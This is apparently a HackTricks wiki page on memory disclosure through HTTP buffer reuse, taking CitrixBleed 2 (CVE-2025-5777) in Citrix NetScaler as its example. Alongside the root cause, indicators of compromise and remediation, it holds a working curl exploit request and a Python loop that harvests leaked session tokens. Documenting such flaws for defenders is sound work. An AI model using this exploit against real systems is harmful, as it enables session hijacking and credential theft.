# Information Disclosure

{{#include ../banners/hacktricks-training.md}}

## HTTP Request Buffer Reuse Memory Disclosure

Some HTTP handlers may not properly clear or initialize form-value buffers before reuse. By supplying only the minimal required fields to such an endpoint, an attacker can cause the application to reference residual memory from previous requests and leak its contents in the HTTP response.

### Example: CitrixBleed 2 (CVE-2025-5777)

Affected Systems:
- Citrix NetScaler ADC/Gateway 14.1 prior to 14.1-43.56
- Citrix NetScaler ADC/Gateway 13.1 prior to 13.1-58.32
- Citrix NetScaler ADC 13.1-FIPS prior to 13.1-37.235-FIPS
- Citrix NetScaler ADC 12.1-FIPS prior to 12.1-55.328-FIPS

#### Vulnerability Root Cause
The `/p/u/doAuthentication.do` handler only validates the presence of the `login` form key and does not verify that its value buffer is initialized. Internally, the pointer to the `login` value may reference leftover data in adjacent heap or stack memory, which is later copied into the response and truncated to 127 bytes before null-termination, resulting in an arbitrary 127-byte memory disclosure per request.

## Exploitation

1. Craft a minimal HTTP POST to the vulnerable endpoint:

   ```bash
   curl -sk -X POST \
     'https://target/p/u/doAuthentication.do' \
     -d 'login=admin'
   ```

2. The response body will include up to 127 bytes of adjacent memory from the application buffer.

### Automated Exfiltration

Use a simple polling script to extract sessions tokens or credentials in real time:

```python
import re, requests

pattern = re.compile(r'[A-Za-z0-9]{24}')
url = 'https://target/p/u/doAuthentication.do'

while True:
    resp = requests.post(url, data={'login':'a'}, verify=False)
    m = pattern.search(resp.text)
    if m:
        print('Leaked Token:', m.group())
```  

## Impact

- Unauthenticated memory disclosure up to 127 bytes per request.
- Leak of sensitive data (e.g., `nsroot` session tokens, plaintext credentials).
- Leads to session hijacking, credential theft, and potential administrative takeover.

## Indicators of Compromise

- Non-printable or unexpected characters in HTTP responses for `/p/u/doAuthentication.do` (if debug logging is enabled).
- Multiple active sessions for a single user from different client IPs:
  ```bash
  show sessions
  ```
- Unexpected session tokens reflected in HTTP responses.

## Remediation and Mitigation

- Upgrade NetScaler ADC/Gateway to versions ≥ 14.1-43.56, 13.1-58.32 and corresponding FIPS builds.
- Terminate existing ICA/PCoIP sessions immediately.
- Audit and compare running configurations:
  ```bash
  show ns runningConfig -withDefaults
  diff -u backup.config current.config
  ```
- Monitor for new administrative accounts or modifications to logging settings.

## References

- Horizon3 Lab. "CVE-2025-5777: CitrixBleed 2 Write-Up… Maybe?" https://horizon3.ai/attack-research/attack-blogs/cve-2025-5777-citrixbleed-2-write-up-maybe/
- Citrix. CTX693420 Advisory: https://support.citrix.com/support-home/kbsearch/article?articleNumber=CTX693420
- Citrix. CTX694788 Advisory: https://support.citrix.com/support-home/kbsearch/article?articleNumber=CTX694788

{{#include /banners/hacktricks-training.md}}
